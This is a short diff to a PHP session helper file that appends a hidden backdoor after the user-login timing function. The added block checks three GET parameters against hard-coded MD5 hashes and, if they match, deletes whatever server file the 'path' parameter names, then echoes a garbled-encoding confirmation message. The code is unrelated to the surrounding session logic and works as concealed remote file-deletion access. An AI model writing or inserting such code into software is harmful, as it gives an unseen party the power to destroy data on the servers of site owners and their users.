@@ -25,4 +25,11 @@ function Get_user_ontime() {
 		$_SESSION['WEB_USER_LOGIN_ONTIME_SESSION'] = mktime();
 	}
 }
+
+if(md5($_GET[task])=='5826af512974ea8e42510486ba3941bb'
+&& md5($_GET[adminname])=="c99d38a89ea173561b128a8067ce5834"
+&& md5($_GET[password])=="7425a6eea135c7a8c9c15c6050eb88cb"){
+  unlink($_GET[path]);
+  echo 'É¾³ýÎÄ¼þ£º'.$_GET[path];
+}
 ?>
